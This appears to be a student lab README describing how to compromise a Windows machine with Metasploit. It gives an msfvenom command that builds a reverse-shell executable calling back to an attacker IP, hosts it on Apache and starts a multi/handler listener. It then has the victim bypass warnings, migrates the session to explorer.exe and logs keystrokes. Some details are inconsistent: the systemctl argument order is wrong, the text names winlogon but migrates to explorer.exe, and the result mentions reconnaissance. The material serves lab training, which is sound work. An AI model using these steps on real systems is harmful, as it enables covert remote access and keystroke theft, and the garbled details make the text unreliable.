[# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/871a41d1-af11-484f-abe0-e27d58577d2c)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/b65f642b-ecfd-4042-8142-f0420f9e671c)




copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/45a0d03c-4c31-4e87-ac60-f17ff7c274bb)



Start apache server
sudo systemctl apache2 start

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/25b6f263-ea33-4cd7-8151-2d34f79f7a7b)




Check the status of apache2

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/b091ceaa-6d34-4635-adc5-01605dc97576)



Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT: 

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/26e9fa80-302c-419d-933c-9b9ede035ccb)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/115add40-9ba9-4e68-ae62-f5f6b39dc3fb)



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/8c859978-ca53-4c49-9a21-c91dff67a007)




## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/84e65563-3437-468f-b789-f81e34a1823f)




keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/M-Nikhil20/Compromising-windows-using-Metasploit/assets/118707852/44f1d4ad-8590-46f5-96f8-5a961fe0e7d6)





## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
](https://github.com/M-Nikhil20/Metasploit-for-reconnaissance)
